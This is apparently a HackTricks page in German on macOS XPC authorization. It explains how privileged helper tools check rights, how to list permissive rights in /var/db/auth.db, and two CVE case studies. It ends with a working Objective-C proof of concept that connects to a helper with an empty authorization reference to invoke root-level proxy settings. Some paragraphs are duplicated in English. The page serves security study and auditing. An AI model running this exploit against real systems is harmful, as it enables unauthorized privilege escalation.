# macOS XPC-Authorisierung

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC-Authorisierung

Apple schlägt außerdem einen weiteren Weg zur Authentifizierung vor, wenn der verbindende Prozess die **Berechtigungen besitzt, eine exponierte XPC-Methode aufzurufen**.

Wenn eine Anwendung **Aktionen als privilegierter Benutzer ausführen muss**, installiert sie anstatt als privilegierter Benutzer ausgeführt zu werden üblicherweise ein HelperTool als XPC-Service unter root, das von der App aufgerufen werden kann, um diese Aktionen durchzuführen. Die die Service aufrufende App sollte jedoch über ausreichende Autorisierung verfügen.

### ShouldAcceptNewConnection immer YES

Ein Beispiel findet sich in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` versucht es, sich mit dem **HelperTool** zu **verbinden**. Und in `HelperTool/HelperTool.m` wird die Funktion **`shouldAcceptNewConnection`** keine der zuvor genannten Anforderungen **prüfen**. Sie gibt immer YES zurück:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Für weitere Informationen darüber, wie diese Prüfung richtig konfiguriert wird:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Anwendungsrechte

Es findet jedoch eine gewisse **Autorisierung statt, wenn eine Methode des HelperTool aufgerufen wird**.

Die Funktion **`applicationDidFinishLaunching`** aus `App/AppDelegate.m` erstellt nach dem Start der App eine leere Autorisierungsreferenz. Das sollte immer funktionieren.\
Dann versucht sie, dieser Autorisierungsreferenz durch den Aufruf von `setupAuthorizationRights` **einige Rechte hinzuzufügen**:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Die Funktion `setupAuthorizationRights` aus `Common/Common.m` speichert in der auth database `/var/db/auth.db` die Rechte der Anwendung. Beachte, dass nur die Rechte hinzugefügt werden, die noch nicht in der Datenbank vorhanden sind:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Die Funktion `enumerateRightsUsingBlock` ist diejenige, die verwendet wird, um die Berechtigungen von Anwendungen zu ermitteln, die in `commandInfo` definiert sind:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
This means that at the end of this process, the permissions declared inside `commandInfo` will be stored in `/var/db/auth.db`. Note how there you can find for **each method** that will r**equire authentication**, **permission name** and the **`kCommandKeyAuthRightDefault`**. The later one **indicates who can get this right**.

Das bedeutet, dass am Ende dieses Prozesses die innerhalb von `commandInfo` deklarierten Berechtigungen in `/var/db/auth.db` gespeichert werden. Beachte, dass du dort für **jede Methode**, die r**Authentifizierung benötigt**, den **Berechtigungsnamen** und das **`kCommandKeyAuthRightDefault`** findest. Letzteres **gibt an, wer dieses Recht erhalten kann**.

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

Es gibt verschiedene Bereiche, um anzugeben, wer auf ein Recht zugreifen kann. Einige davon sind in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) definiert (du findest [alle hier](https://www.dssw.co.uk/reference/authorization-rights/)), aber zur Zusammenfassung:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Wert</th><th>Beschreibung</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Jeder</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niemand</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Der aktuelle Benutzer muss ein Admin sein (innerhalb der Admin-Gruppe)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Fordert den Benutzer zur Authentifizierung auf.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Fordert den Benutzer zur Authentifizierung auf. Er muss ein Admin sein (innerhalb der Admin-Gruppe)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Regeln angeben</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Zusätzliche Kommentare zum Recht angeben</td></tr></tbody></table>

### Rights Verification

### Überprüfung der Rechte

In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **execute such method** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **correct format** and then will check **what is needed to get the right** to call the specific method. If all goes good the **returned `error` will be `nil`**:

In `HelperTool/HelperTool.m` prüft die Funktion **`readLicenseKeyAuthorization`**, ob der Aufrufer berechtigt ist, **eine solche Methode auszuführen**, indem sie die Funktion **`checkAuthorization`** aufruft. Diese Funktion überprüft, ob die vom aufrufenden Prozess gesendeten **authData** ein **korrektes Format** haben, und prüft dann, **was nötig ist, um das Recht** zu erhalten, die spezifische Methode aufzurufen. Wenn alles gut läuft, ist der **zurückgegebene `error` `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Beachte, dass die Funktion `authorizationRightForCommand` zur **Überprüfung der Voraussetzungen zum Erlangen des Rechts** zum Aufruf dieser Methode lediglich das zuvor kommentierte Objekt **`commandInfo`** prüft. Anschließend ruft sie **`AuthorizationCopyRights`** auf, um zu prüfen, **ob sie die Rechte** hat, die Funktion aufzurufen (beachte, dass die Flags eine Interaktion mit dem Benutzer erlauben).

In diesem Fall ist für den Aufruf der Funktion `readLicenseKeyAuthorization` das `kCommandKeyAuthRightDefault` auf `@kAuthorizationRuleClassAllow` gesetzt. Daher kann **jeder sie aufrufen**.

### DB-Informationen

Es wurde erwähnt, dass diese Informationen in `/var/db/auth.db` gespeichert sind. Du kannst alle gespeicherten Regeln mit folgendem Befehl auflisten:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Dann kannst du lesen, wer auf das Recht zugreifen kann:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive-Rechte

You can find **all the permissions configurations** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), but the combinations that won't require user interaction would be:

1. **'authenticate-user': 'false'**
- Dies ist der direkteste Schlüssel. Wenn auf `false` gesetzt, gibt er an, dass ein Benutzer keine Authentifizierung angeben muss, um dieses Recht zu erlangen.
- Wird in **Kombination mit einem der beiden untenstehenden oder durch Angabe einer Gruppe** verwendet, der der Benutzer angehören muss.
2. **'allow-root': 'true'**
- Wenn ein Benutzer als root arbeitet (was erweiterte Berechtigungen hat) und dieser Schlüssel auf `true` gesetzt ist, könnte der root-Benutzer möglicherweise dieses Recht ohne weitere Authentifizierung erhalten. Allerdings erfordert das Erlangen von root-Rechten normalerweise bereits eine Authentifizierung, sodass dies für die meisten Benutzer kein "keine Authentifizierung"-Szenario ist.
3. **'session-owner': 'true'**
- Wenn auf `true` gesetzt, erhält der Besitzer der Session (der aktuell eingeloggte Benutzer) dieses Recht automatisch. Dies kann zusätzliche Authentifizierungen umgehen, wenn der Benutzer bereits eingeloggt ist.
4. **'shared': 'true'**
- Dieser Schlüssel gewährt keine Rechte ohne Authentifizierung. Stattdessen bedeutet `true`, dass, sobald das Recht authentifiziert wurde, es unter mehreren Prozessen geteilt werden kann, ohne dass jeder sich erneut authentifizieren muss. Die anfängliche Gewährung des Rechts würde jedoch weiterhin eine Authentifizierung erfordern, sofern sie nicht mit anderen Schlüsseln wie `'authenticate-user': 'false'` kombiniert wird.

You can [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) to get the interesting rights:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Fallstudien

- **CVE-2024-4395 – Jamf Compliance Editor helper**: Ein Audit legt `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` ab, exponiert den Mach-Service `com.jamf.complianceeditor.helper` und exportiert `-executeScriptAt:arguments:then:` ohne die `AuthorizationExternalForm` des Aufrufers oder die Codesignatur zu prüfen. Ein triviales Exploit führt `AuthorizationCreate` für eine leere Referenz aus, verbindet sich mit `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` und ruft die Methode auf, um beliebige Binaries als root auszuführen. Detaillierte Reversing-Notizen (inkl. PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 und 7.4.0–7.4.2 akzeptierten manipulierte XPC-Nachrichten, die einen privilegierten Helper ohne Autorisierungsprüfungen erreichten. Da der Helper seinem eigenen privilegierten `AuthorizationRef` vertraute, konnte jeder lokale Benutzer, der den Dienst ansprechen konnte, ihn dazu zwingen, beliebige Konfigurationsänderungen oder Befehle als root auszuführen. Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Schnelle Triage-Tipps

- Wenn eine App sowohl eine GUI als auch einen Helper ausliefert, vergleiche ihre Code-Anforderungen und prüfe, ob `shouldAcceptNewConnection` den Listener mit `-setCodeSigningRequirement:` sperrt (oder `SecCodeCopySigningInformation` validiert). Fehlende Prüfungen führen meist zu CWE-863-Szenarien wie im Jamf-Fall. Ein kurzer Blick sieht so aus:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Vergleiche, was der Helper *glaubt*, dass er autorisiert, mit dem, was der Client liefert. Beim Reverse Engineering setze einen Breakpoint auf `AuthorizationCopyRights` und bestätige, dass das `AuthorizationRef` von `AuthorizationCreateFromExternalForm` (vom Client bereitgestellt) stammt und nicht aus dem eigenen privilegierten Kontext des Helpers; andernfalls hast du wahrscheinlich ein CWE-863-Muster wie oben gefunden.

## Reverse-Engineering der Autorisierung

### Prüfen, ob EvenBetterAuthorization verwendet wird

Wenn du die Funktion findest: **`[HelperTool checkAuthorization:command:]`**, verwendet der Prozess wahrscheinlich das zuvor erwähnte Schema zur Autorisierung:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Wenn diese Funktion Aufrufe wie `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` tätigt, verwendet sie [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Prüfe die **`/var/db/auth.db`**, um zu sehen, ob es möglich ist, Berechtigungen zu erhalten, um eine privilegierte Aktion ohne Benutzerinteraktion aufzurufen.

### Protokollkommunikation

Dann musst du das Protokollschema finden, um eine Kommunikation mit dem XPC-Service herstellen zu können.

Die Funktion **`shouldAcceptNewConnection`** zeigt das exportierte Protokoll an:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In diesem Fall haben wir dasselbe wie in EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Wenn du den Namen des verwendeten Protokolls kennst, ist es möglich, seine Header-Definition mit folgendem Befehl zu dumpen:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Zuletzt müssen wir nur den **Namen des exponierten Mach Service** kennen, um eine Kommunikation mit ihm herzustellen. Es gibt mehrere Möglichkeiten, diesen zu finden:

- Im **`[HelperTool init]`**, wo man sehen kann, dass der Mach Service verwendet wird:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- In der launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit-Beispiel

In diesem Beispiel wird Folgendes erstellt:

- Die Definition des Protokolls mit den Funktionen
- Eine leere auth, die verwendet wird, um Zugriff anzufragen
- Eine Verbindung zum XPC-Dienst
- Ein Aufruf der Funktion, falls die Verbindung erfolgreich war
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Weitere XPC privilege helpers, die missbraucht werden

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Referenzen

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
